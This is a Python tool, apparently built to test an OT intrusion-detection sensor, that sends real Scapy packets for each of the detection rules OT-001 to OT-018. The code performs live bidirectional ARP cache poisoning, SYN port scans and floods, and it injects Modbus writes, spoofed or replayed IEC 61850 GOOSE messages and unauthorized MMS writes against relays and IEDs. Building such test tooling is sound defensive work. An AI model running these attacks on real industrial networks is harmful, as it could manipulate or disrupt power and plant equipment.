#!/usr/bin/env python3
"""SenseL OT attack/traffic generator — REAL packets on the wire via Scapy.

Every sub-command crafts and *sends* genuine frames (no synthetic fixtures), so
the passive packet-sensor observes them exactly as it would a live adversary.
Sub-commands map 1:1 to detection rules OT-001 ~ OT-018.

Run a single scenario:
    python attacker.py arp-spoof --victim 192.168.10.20 --gateway 192.168.10.1
    python attacker.py rogue-goose
    python attacker.py mms-rogue --dst 192.168.10.50

Run the full sweep (OT-001 ~ OT-018, except absence-based OT-009):
    python attacker.py all

Interface / addresses are taken from CLI flags first, then ATTACK_* env vars.
SAFETY: arp-spoof performs real bidirectional ARP cache poisoning. Only run it
on a fully isolated lab segment. It restores correct bindings on exit (Ctrl-C).
"""

from __future__ import annotations

import argparse
import os
import random
import signal
import sys
import time

from scapy.all import (
    ARP,
    Ether,
    IP,
    Raw,
    TCP,
    get_if_hwaddr,
    getmacbyip,
    sendp,
    srp,
)

from src.parser.l7.iec61850.goose import GOOSE_ETHERTYPE, build_goose_wire
from src.parser.l7.iec61850.mms import build_mms_write_probe

IFACE = os.environ.get("ATTACK_INTERFACE", "eth0")
RELAY_IP = os.environ.get("ATTACK_RELAY_IP", "192.168.10.20")
IED_IP = os.environ.get("ATTACK_IED_IP", "192.168.10.50")
ROGUE_IP = os.environ.get("ATTACK_ROGUE_IP", "192.168.10.231")
GATEWAY_IP = os.environ.get("ATTACK_GATEWAY_IP", "192.168.10.1")


def _log(msg: str) -> None:
    print(f"[attacker] {msg}", flush=True)


def _rand_mac() -> str:
    # Locally-administered, unicast (second-least-significant bit of first octet)
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(5))


def _src_mac(iface: str) -> str:
    try:
        return get_if_hwaddr(iface)
    except Exception:
        return _rand_mac()


# --------------------------------------------------------------------------- #
# OT-001 New MAC / OT-002 New IP / OT-004 New pair / OT-005 New dst port
# --------------------------------------------------------------------------- #
def attack_new_mac(args) -> None:
    """OT-001: announce a never-before-seen MAC on the mirror segment."""
    for _ in range(args.count):
        mac = _rand_mac()
        frame = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / ARP(
            op=1, hwsrc=mac, psrc=ROGUE_IP, pdst=args.gateway
        )
        sendp(frame, iface=args.iface, verbose=False)
        _log(f"OT-001 sent frame from novel MAC {mac}")
        time.sleep(args.interval)


def attack_new_ip(args) -> None:
    """OT-002: a host appears with a never-before-seen IP (ARP announcement)."""
    mac = _src_mac(args.iface)
    frame = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / ARP(
        op=2, hwsrc=mac, psrc=args.rogue, pdst=args.rogue
    )
    sendp(frame, iface=args.iface, verbose=False)
    _log(f"OT-002 announced novel IP {args.rogue} (gratuitous ARP)")


def attack_new_pair(args) -> None:
    """OT-004 + OT-005: a brand new src->dst:port conversation."""
    mac = _src_mac(args.iface)
    frame = (
        Ether(src=mac)
        / IP(src=args.rogue, dst=args.relay)
        / TCP(sport=random.randint(40000, 60000), dport=8080, flags="S")
    )
    sendp(frame, iface=args.iface, verbose=False)
    _log(f"OT-004/OT-005 new pair {args.rogue}->{args.relay}:8080")


# --------------------------------------------------------------------------- #
# OT-003 ARP spoofing — real bidirectional MITM cache poisoning
# --------------------------------------------------------------------------- #
def attack_arp_spoof(args) -> None:
    """OT-003: poison victim <-> gateway ARP caches (real MITM).

    Sends unsolicited ARP replies telling the victim that <gateway> is at the
    attacker's MAC, and telling the gateway that <victim> is at the attacker's
    MAC. The sensor sees sender_ip=gateway/victim with the attacker's MAC,
    i.e. the (ip -> mac) binding flips → OT-003.
    """
    attacker_mac = args.attacker_mac or _src_mac(args.iface)
    victim, gateway = args.victim, args.gateway
    _log(f"ARP MITM: attacker_mac={attacker_mac} victim={victim} gateway={gateway}")

    real_victim_mac = getmacbyip(victim)
    real_gateway_mac = getmacbyip(gateway)
    _log(f"resolved victim_mac={real_victim_mac} gateway_mac={real_gateway_mac}")

    def _restore(*_a) -> None:
        if real_victim_mac and real_gateway_mac:
            _log("restoring correct ARP bindings…")
            for _ in range(3):
                # Tell victim the real gateway MAC, and gateway the real victim MAC.
                sendp(
                    Ether(src=real_gateway_mac, dst=real_victim_mac)
                    / ARP(op=2, hwsrc=real_gateway_mac, psrc=gateway,
                          hwdst=real_victim_mac, pdst=victim),
                    iface=args.iface, verbose=False,
                )
                sendp(
                    Ether(src=real_victim_mac, dst=real_gateway_mac)
                    / ARP(op=2, hwsrc=real_victim_mac, psrc=victim,
                          hwdst=real_gateway_mac, pdst=gateway),
                    iface=args.iface, verbose=False,
                )
                time.sleep(0.2)
        sys.exit(0)

    signal.signal(signal.SIGINT, _restore)
    signal.signal(signal.SIGTERM, _restore)

    sent = 0
    while args.loop or sent < args.count:
        # Poison the victim: "gateway is at attacker_mac"
        sendp(
            Ether(src=attacker_mac, dst=real_victim_mac or "ff:ff:ff:ff:ff:ff")
            / ARP(op=2, hwsrc=attacker_mac, psrc=gateway,
                  hwdst=real_victim_mac or "ff:ff:ff:ff:ff:ff", pdst=victim),
            iface=args.iface, verbose=False,
        )
        # Poison the gateway: "victim is at attacker_mac"
        sendp(
            Ether(src=attacker_mac, dst=real_gateway_mac or "ff:ff:ff:ff:ff:ff")
            / ARP(op=2, hwsrc=attacker_mac, psrc=victim,
                  hwdst=real_gateway_mac or "ff:ff:ff:ff:ff:ff", pdst=gateway),
            iface=args.iface, verbose=False,
        )
        sent += 1
        _log(f"OT-003 poisoned bindings (round {sent})")
        time.sleep(args.interval)
    _restore()


# --------------------------------------------------------------------------- #
# OT-006 Port scan
# --------------------------------------------------------------------------- #
def attack_port_scan(args) -> None:
    """OT-006: SYN sweep many ports from one source within the window."""
    mac = _src_mac(args.iface)
    for port in range(1, args.ports + 1):
        frame = (
            Ether(src=mac)
            / IP(src=args.rogue, dst=args.relay)
            / TCP(sport=random.randint(40000, 60000), dport=port, flags="S")
        )
        sendp(frame, iface=args.iface, verbose=False)
        time.sleep(args.interval)
    _log(f"OT-006 scanned {args.ports} ports on {args.relay} from {args.rogue}")


# --------------------------------------------------------------------------- #
# OT-007 Unexpected Modbus write / OT-010 Unauthorized relay access
# --------------------------------------------------------------------------- #
def _modbus_write(src: str, dst: str, fc: int = 16) -> bytes:
    # MBAP: trans(2) proto(2) len(2) unit(1) + PDU: fc(1) + addr/qty/bytes
    return b"\x00\x01\x00\x00\x00\x06\x01" + bytes([fc]) + b"\x00\x01\x00\x02"


def attack_modbus_write(args) -> None:
    """OT-007 (+OT-010): Modbus write coil/register from a non-baselined host."""
    mac = _src_mac(args.iface)
    for _ in range(args.count):
        frame = (
            Ether(src=mac)
            / IP(src=args.rogue, dst=args.relay)
            / TCP(sport=random.randint(40000, 60000), dport=502, flags="PA")
            / Raw(_modbus_write(args.rogue, args.relay, args.fc))
        )
        sendp(frame, iface=args.iface, verbose=False)
        _log(f"OT-007 Modbus write fc={args.fc} {args.rogue}->{args.relay}:502")
        time.sleep(args.interval)


def attack_unauthorized_relay(args) -> None:
    """OT-010: a non-allowed peer touches the relay asset at all."""
    mac = _src_mac(args.iface)
    frame = (
        Ether(src=mac)
        / IP(src=args.rogue, dst=args.relay)
        / TCP(sport=random.randint(40000, 60000), dport=502, flags="S")
    )
    sendp(frame, iface=args.iface, verbose=False)
    _log(f"OT-010 unauthorized host {args.rogue} -> relay {args.relay}")


# --------------------------------------------------------------------------- #
# OT-008 Abnormal traffic rate
# --------------------------------------------------------------------------- #
def attack_traffic_flood(args) -> None:
    """OT-008: burst well above the asset's baseline packet rate."""
    mac = _src_mac(args.iface)
    frame = (
        Ether(src=mac)
        / IP(src=args.rogue, dst=args.relay)
        / TCP(sport=random.randint(40000, 60000), dport=502, flags="A")
    )
    sendp([frame] * args.count, iface=args.iface, verbose=False)
    _log(f"OT-008 flooded {args.count} packets toward {args.relay}")


# --------------------------------------------------------------------------- #
# OT-011/012/013 GOOSE
# --------------------------------------------------------------------------- #
def _send_goose(iface, src_mac, appid, gocb, go_id, st, sq, test=False) -> None:
    payload = build_goose_wire(appid, gocb, go_id, st, sq, test=test)
    frame = Ether(dst="01:0c:cd:01:00:01", src=src_mac, type=GOOSE_ETHERTYPE) / Raw(payload)
    sendp(frame, iface=iface, verbose=False)


def attack_rogue_goose(args) -> None:
    """OT-011: a GOOSE publisher (MAC/appid/gocb) not present in the baseline."""
    src_mac = args.src_mac or "02:de:ad:be:ef:11"
    for sq in range(1, args.count + 1):
        _send_goose(args.iface, src_mac, 0x3FFF, "roguePublisher/LLN0.gcbBad",
                    "rogueEvents", st=1, sq=sq)
        _log(f"OT-011 rogue GOOSE publisher mac={src_mac} appid=0x3fff")
        time.sleep(args.interval)


def attack_goose_test(args) -> None:
    """OT-012: GOOSE with the test bit set on a production publisher."""
    src_mac = args.src_mac or "00:11:22:33:44:55"  # baseline publisher MAC
    for sq in range(1, args.count + 1):
        _send_goose(args.iface, src_mac, 1000, "simpleIOGenericIO/LLN0.gcbEvents",
                    "labEvents", st=1, sq=sq, test=True)
        _log("OT-012 GOOSE test bit set on production publisher")
        time.sleep(args.interval)


def attack_goose_stnum(args) -> None:
    """OT-013: stNum rollback / large jump for an established publisher."""
    src_mac = args.src_mac or "00:11:22:33:44:55"
    gocb, go_id, appid = "simpleIOGenericIO/LLN0.gcbEvents", "labEvents", 1000
    # Establish a baseline stNum first…
    _send_goose(args.iface, src_mac, appid, gocb, go_id, st=50, sq=1)
    time.sleep(args.interval)
    # …then roll it backwards (replay) — stNum < previous.
    _send_goose(args.iface, src_mac, appid, gocb, go_id, st=2, sq=2)
    _log("OT-013 stNum rollback 50 -> 2 (replay indicator)")
    time.sleep(args.interval)
    # …and a forward jump > goose_stnum_jump_max (100).
    _send_goose(args.iface, src_mac, appid, gocb, go_id, st=500, sq=3)
    _log("OT-013 stNum jump -> 500")


# --------------------------------------------------------------------------- #
# OT-014/016/018 MMS
# --------------------------------------------------------------------------- #
def attack_mms_flood(args) -> None:
    """OT-015: a burst of new MMS sessions (distinct client IPs) to one IED."""
    mac = _src_mac(args.iface)
    payload = build_mms_write_probe()
    n = max(args.count, 25)
    for i in range(n):
        client = f"10.40.0.{i % 254 + 1}"
        frame = (
            Ether(src=mac)
            / IP(src=client, dst=args.dst)
            / TCP(sport=46000 + (i % 1000), dport=102, flags="PA")
            / Raw(payload)
        )
        sendp(frame, iface=args.iface, verbose=False)
        time.sleep(args.interval)
    _log(f"OT-015 flooded {n} new MMS sessions toward {args.dst}")


def attack_mms_rogue(args) -> None:
    """OT-014 + OT-016 + OT-018: a non-allowed client writes to a baselined IED.

    The MMS write probe from a client IP not in allowed_mms_clients toward an IED
    that *is* in the baseline trips new-client (014), write-anomaly (016) and
    unauthorized-client (018) together.
    """
    mac = _src_mac(args.iface)
    payload = build_mms_write_probe()
    for seq in range(args.count):
        frame = (
            Ether(src=mac)
            / IP(src=args.rogue, dst=args.dst)
            / TCP(sport=45000 + (seq % 1000), dport=102, flags="PA")
            / Raw(payload)
        )
        sendp(frame, iface=args.iface, verbose=False)
        _log(f"OT-014/016/018 rogue MMS write {args.rogue}->{args.dst}:102")
        time.sleep(args.interval)


# --------------------------------------------------------------------------- #
# OT-009 helper (absence-based — cannot be "sent")
# --------------------------------------------------------------------------- #
def attack_relay_silence(args) -> None:
    """OT-009 is detected by ABSENCE: a baselined relay stops being seen.

    There is nothing to transmit. To exercise it: ensure the relay was observed
    (run any relay-directed scenario once), then stop ALL traffic to/from the
    relay address for > silence_sec (default 120s). The detector fires on the
    next feature window. This command just prints the procedure.
    """
    _log("OT-009 is absence-based; stop relay traffic for >120s to trigger it.")
    _log(f"  1) seed: python attacker.py unauth-relay --relay {args.relay}")
    _log("  2) keep the relay silent for >120s (no packets to/from it)")
    _log("  3) OT-009 RELAY_OFFLINE fires on the next 60s feature window")


# --------------------------------------------------------------------------- #
# Full sweep
# --------------------------------------------------------------------------- #
def attack_all(args) -> None:
    _log("=== running full OT-001~018 sweep (OT-009 is absence-based, skipped) ===")
    seq = [
        ("OT-001 new-mac", attack_new_mac),
        ("OT-002 new-ip", attack_new_ip),
        ("OT-004/005 new-pair", attack_new_pair),
        ("OT-006 port-scan", attack_port_scan),
        ("OT-007 modbus-write", attack_modbus_write),
        ("OT-008 traffic-flood", attack_traffic_flood),
        ("OT-010 unauthorized-relay", attack_unauthorized_relay),
        ("OT-011 rogue-goose", attack_rogue_goose),
        ("OT-012 goose-test", attack_goose_test),
        ("OT-013 goose-stnum", attack_goose_stnum),
        ("OT-014/016/018 mms-rogue", attack_mms_rogue),
        ("OT-015 mms-flood", attack_mms_flood),
    ]
    for name, fn in seq:
        _log(f"--- {name} ---")
        try:
            fn(args)
        except Exception as exc:  # keep going through the sweep
            _log(f"!! {name} failed: {exc}")
        time.sleep(1)
    _log("=== sweep complete (run arp-spoof separately; it is a live MITM) ===")


SCENARIOS = {
    "new-mac": attack_new_mac,
    "new-ip": attack_new_ip,
    "new-pair": attack_new_pair,
    "arp-spoof": attack_arp_spoof,
    "port-scan": attack_port_scan,
    "modbus-write": attack_modbus_write,
    "unauth-relay": attack_unauthorized_relay,
    "traffic-flood": attack_traffic_flood,
    "rogue-goose": attack_rogue_goose,
    "goose-test": attack_goose_test,
    "goose-stnum": attack_goose_stnum,
    "mms-rogue": attack_mms_rogue,
    "mms-flood": attack_mms_flood,
    "relay-silence": attack_relay_silence,
    "all": attack_all,
}


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(description="SenseL OT real attack/traffic generator")
    p.add_argument("scenario", choices=sorted(SCENARIOS), help="attack scenario to run")
    p.add_argument("--iface", default=IFACE)
    p.add_argument("--relay", default=RELAY_IP, help="relay asset IP (baseline)")
    p.add_argument("--dst", default=IED_IP, help="MMS IED IP (baseline)")
    p.add_argument("--rogue", default=ROGUE_IP, help="attacker / non-baselined source IP")
    p.add_argument("--gateway", default=GATEWAY_IP)
    p.add_argument("--victim", default=RELAY_IP, help="ARP MITM victim IP")
    p.add_argument("--attacker-mac", default=os.environ.get("ATTACK_MAC", ""))
    p.add_argument("--src-mac", default="", help="override GOOSE/MMS source MAC")
    p.add_argument("--count", type=int, default=int(os.environ.get("ATTACK_COUNT", "5")))
    p.add_argument("--ports", type=int, default=20, help="OT-006 number of ports to scan")
    p.add_argument("--fc", type=int, default=16, help="OT-007 Modbus function code")
    p.add_argument("--interval", type=float, default=float(os.environ.get("ATTACK_INTERVAL", "0.5")))
    p.add_argument("--loop", action="store_true", help="arp-spoof: loop until killed")
    return p


def main() -> int:
    args = build_parser().parse_args()
    if args.scenario == "traffic-flood" and args.count < 200:
        args.count = 2000  # ensure we clear baseline*multiplier
    SCENARIOS[args.scenario](args)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
